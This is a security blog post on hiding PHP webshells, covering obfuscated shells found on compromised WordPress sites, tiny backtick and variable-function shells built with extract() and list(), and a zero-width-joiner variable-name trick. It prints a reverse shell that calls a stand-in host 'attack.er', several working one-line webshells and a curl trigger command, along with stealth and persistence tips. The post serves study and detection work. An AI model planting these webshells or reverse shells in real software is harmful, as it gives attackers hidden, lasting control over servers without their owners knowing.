---
layout: posts
title:  Hidden in plain sight
date:   2023-10-31
categories: stuff
---

_A few thoughts about PHP webshells ..._

Do you think such a piece of code could be harmful ?

```php
list($x, $x‍) = $_POST;
$x($x‍);
```

If no, please read further ...

# Intro

Although it is fun to find tricky client-side injections, path traversals or IDORs in web applications, it is generally much more satisfying to gain arbitrary code execution (or even better, a command execution). Therefore, arbitrary code execution (or generally referred to as RCE - Remote Code Execution) is not a vulnerability _per se_, but is the attack resulting from an exploited vulnerability (or a chain of vulnerabilities). Multiple vulnerabilities are known to potentially be the root cause of an RCE, such as (and not limited to):
* Local File Inclusion, for which an attacker includes a data stream so as to evaluate it ;
* SQL injection, if the DBMS capabilities allow it, and if the abused service account is privileged enough (local file writes, `xp_cmd_shell`, `COPY ... FROM PROGRAM`, etc.) ;
* Unrestricted File Upload / Arbitrary File Write, for which an attacker can drop their own scripts on the server, and is able to make the latter execute them ;
* Unsafe Deserialisation, for which an attacker creates arbitrary objects, and possibly calls arbitrary routines ;
* Commands Injection, for which an attacker includes their own commands into a legitimate one ;

However, gaining an arbitrary code execution is not always an immediate _game over_, because:
* Turning the code execution into command execution might be sometimes tricky ;
* The attacker generally wants to be the only one controlling the target, and wants to prevent the server from being compromised by someone else ;
* An antimalware solution might be triggered by obvious payloads, that could also warn the webmaster ;
* This same webmaster, while doing their daily routine, might be triggered by unexpected artefacts (e.g. files, logs) ;
* Ensuring persistence is also a commonly pursued goal, saving the need of a future re-exploitation ;

Being stealth and efficient at the same time might be challenging. As a first common approach, attackers could leave powerful webshells somewhere on the disk, at an unexpected location where it is unlikely that a webmaster finds them. A second common solution would be to open a reverse shell, if possible, with something like:

```php
$sock = fsockopen("attack.er",1234);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

If the host and port are hardcoded, it might only appear as a hanging blank page to those who find it unintentionally, and cannot be abused by other attackers. Finally, a third common approach would be to drop only a minimalist webshell such as

```
<?=`$_GET[0]`;?>
```

The payload can be written in its own file, or hidden somewhere in a legitimate one, where it is more difficult to find.

# Obfuscation or minimalism ?

In the first case, powerful webshells are often heavily obfuscated. Taking a look at the malware should quickly raise suspicion with weird symbols, _dirty_ code, escaped strings, etc. To let the compromised web site work properly, it is common for such webshells to be either put in their own files, or prepended or appended to legitimate ones. For instance, let's take a look at this webshell I found on a compromised WordPress site:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="webshell_obf" src="/assets/res/stuff/webshell_obf.png">

The principle of this one is quite simple: the file reads itself and looks for the marker `?>`, indicating the end of the PHP code (the encoded text starting with `=0UV...`, in this case). The data after the marker is then saved as `$L66Rgr[1]` and its decoded version as `L6CRgr[2]`. Then `preg_replace` is used as a pretext to execute `eval` on the latter.

Some other webshells also put an encrypted payload in an external text file, and use poor crypto to recover and evaluate it. Not shown here to keep it simple, but the class `UnsafeCrypto` only uses `openssl_*` functions to decrypt/encrypt with `aes-256-ctr` and hardcoded parameters.

<img width="75%" style="margin-left:auto;margin-right:auto;display:block;" alt="webshell_enc" src="/assets/res/stuff/webshell_enc.png">

Finally, let's take this other webshell, coming as a backdoored `index.php` file:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="backdoored_index" src="/assets/res/stuff/backdoored_index.png">

No doubt that the second line has nothing to do there, and that someone who knows a little bit of PHP and security would find it suspicious. Although it would take time to fully understand what this webshell does (assuming that it is unknown), the malicious intent is quite obvious. To make it stealthier, an attacker could prefer another approach: injecting something like ``` `$_GET[0]`; ``` somewhere in a legitimate PHP file (note the backticks). This code executes GET arguments as a bash command, because of the backtick operators, acting like a call to `shell_exec`. Such a tiny line would not raise much suspicion if lost in the legitimate code.

One could identify three main strategies for such tiny payloads:
* Having a webshell that calls an `exec`-like functions (`system`, `passthru`, `shell_exec` or the backtick operator, `proc_open`, `popen`, `pcntl_exec`), passing as argument a user-supplied input (e.g. `<?php system($_GET[0]); ?>`). Indeed, what an attacker generally wants is to execute bash commands ;
* Having a webshell that calls `eval`-like functions, knowing that alternatives are made more difficult to exploit with PHP 8. This second solution makes the webshell even more versatile, but the drawback is that `eval` cannot be used as a variable function. Whereas it is possible to call `system` with something like `('sys'.'tem')/**/('id');`, doing so with `eval` would not work ([source: Variable functions](https://www.php.net/manual/en/functions.variable-functions.php)) ;
* Having a webshell for which function names are dynamically resolved with variable functions, such as `<?php $_GET['a']($_GET['b']);`. This third solution is an in between since it does not hardcode the routine name, while still being a bit more restrictive than an `eval`.

# The `extract` routine

An uncommon way to apply the third solution is to use the routine `extract` ([documentation](https://www.php.net/manual/en/function.extract)). According to the documentation:

>
>extract — Import variables into the current symbol table from an array  
>...  
>Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).  
>

In other words, such a piece of code:

```php
extract(array("a" => "b", "c" => "d"));
```

would create the variable `$a = "b"` and `$c = "d"`. Combining it with variable functions, it is now clear that `$_GET['a']($_GET['b']);` could be written as:

```php
extract($_GET);
$a($b);
```

In other words, using `extract` in this way is like setting `register_globals` to `on`.

_The routine `parse_str` could have the same effect if it is used with only one argument. But as of PHP 8.0.0, the second parameter is mandatory._

# The `list` routine

Another interesting routine similar to `extract` is [`list`](https://www.php.net/manual/en/function.list.php). As stated in the doc:

>
>Like array(), this is not really a function, but a language construct. list() is used to assign a list of variables in one operation. Strings cannot be unpacked and list() expressions cannot be completely empty.
>

Compared to `extract`, the documentation does not warn here against misuses. My guess is that a misuse of `extract` would involve the passed parameter (a user-controlled array), while a misuse of `list` would involve the right side of the assignment, and therefore not something directly related to the routine itself. For example, the following snippet would create the variables `$drink`, `$color` and `$power`, respectively assigning to them the values _coffee_, _brown_, and _caffeine_ (from the doc). 

```php
$info = array('coffee', 'brown', 'caffeine');
list($drink, $color, $power) = $info;
```

To make it behave like `extract`, one would need to write something like:

```php
list($a,$b) = $_POST;
$a($b);
```

To trigger the code execution, one would then need to send something like:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="webshell_list" src="/assets/res/stuff/webshell_list.png">


By default, index names are increasing integers. The `extract` solution has the advantage that no obvious relation exists between the `$_POST` and the variables `$a` and `$b`; 

# Weird PHP variables

Does this tiny PHP file seem harmful ?

```php
list($x, $x‍) = $_POST;
$x($x‍);
```

_These two lines of PHP code could be put somewhere in a legitimate file (maybe not as sequential instructions)._

Of course, the second line extracts untrusted data and creates variables from it, and uses it to call variable functions. However, it seems that it can only be something like `'system'('system')` or `'exec'('exec')`, with the argument value being the same as the function name, and such instructions should not be useful. Is it, really ?

However, running an `xxd` on the file reveals that the second `$x` is actually not the same as the first one. The variable name also contains the _U+200D ZERO WIDTH JOINER_ character (`\xE2\x80\x8D`). 

<img width="50%" style="margin-left:auto;margin-right:auto;display:block;" alt="weird_shell2" src="/assets/res/stuff/weird_shell2.png">

Some odd non-printable characters are appended to its name. According to the PHP documentation, variable names are valid as long as they follow this regular expression:

```
^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$
```

which means that letters (uppercase and lowercase), numbers, underscores and binary characters can be used (the first one cannot be a number). Some of these non-printable characters can be invisible ([invisible-characters.com](https://invisible-characters.com/)), making `$x` variables visually (almost) the same. To trigger code execution, the same payload can be used:

```bash
$ curl -k http://targ.et/test.php -d '0=system' -d '1=uname -a'
```

However, if the version with `extract` is used:

```php
extract($_POST);
$x($x‍);
```

named indexes must be used for the two `$x` variables (a real one and a look-alike), and the `curl` command would be something like:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="weird_shell3" src="/assets/res/stuff/weird_shell3.png">


# Sources:
* [PHP Backdoors: Hidden With Clever Use of Extract Function](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html)